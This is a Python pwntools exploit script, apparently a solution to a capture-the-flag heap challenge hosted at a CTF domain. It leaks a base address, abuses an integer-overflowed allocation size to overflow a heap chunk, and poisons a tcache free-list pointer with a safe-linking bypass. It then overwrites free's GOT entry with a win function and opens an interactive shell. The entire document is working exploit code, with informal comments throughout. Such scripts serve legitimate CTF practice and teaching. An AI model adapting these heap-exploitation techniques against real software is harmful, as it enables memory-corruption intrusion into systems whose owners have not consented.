from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

def register(idx, count, size, data):
    p.sendline(b'1')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Item count: ')
    p.sendline(str(count).encode())
    p.recvuntil(b'Item size (bytes): ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data:\n')
    p.send(data)
    recv_menu()

def view(idx):
    p.sendline(b'2')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    res = p.recvuntil(b'\n\n===', drop=True)
    recv_menu()
    return res

def inspect(idx):
    p.sendline(b'3')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Validator    : ')
    validator = int(p.recvline().strip(), 16)
    p.recvuntil(b'Checkpoint   : ')
    checkpoint = int(p.recvline().strip(), 16)
    recv_menu()
    return validator, checkpoint

def delete(idx):
    p.sendline(b'4')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    recv_menu()

recv_menu()
register(0, 1, 16, b'A'*16)
register(1, 1, 16, b'B'*16)
register(2, 1, 16, b'C'*16)

val, chk0 = inspect(0)
_, chk1 = inspect(1)

base_addr = val - 0x136c
win_func = base_addr + 0x14a8
print(f"Base: {hex(base_addr)}, Win: {hex(win_func)}")

delete(2)
delete(1)

# Now tcache 16 has: 1 -> 2
# But wait, size 16 becomes 32 (0x20) chunk.
# Let's use the heap overflow on chunk 0!
# We re-allocate 0 but with an overflow.
# Wait, we can't re-allocate 0 without deleting it, but if we delete it, it goes into tcache too.
# Let's delete 0, then allocate 0 with the overflow.
delete(0)
# Tcache: 0 -> 1 -> 2

# We need chunk 0 to be allocated. We do size 1!
# Wait, 256*256 = 1 byte allocation (size 0x20 chunk), but reads 65536 bytes.
# So chunk 0 is allocated.
# The payload will overwrite chunk 1's header, and fd pointer.

payload = b'A' * 24 # Fill chunk 0 data
payload += p64(0x21) # Chunk 1 size
free_got = base_addr + 0x35f8
# We need to safe-link free_got.
# fd = free_got ^ (chk1 >> 12)
fd = free_got ^ (chk1 >> 12)
payload += p64(fd) # Overwrite fd

p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'256')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'256')
p.recvuntil(b'data:\n')
p.send(payload.ljust(65536, b'\x00'))
recv_menu()

# Now allocate chunk 1
register(1, 1, 16, b'X'*16)
# Now allocate chunk 2 -> this will be at free_got!
# We overwrite free_got with win_func.
register(2, 1, 16, p64(win_func) + p64(0))

# Call free(0) to trigger win_func!
p.sendline(b'4')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')

p.interactive()
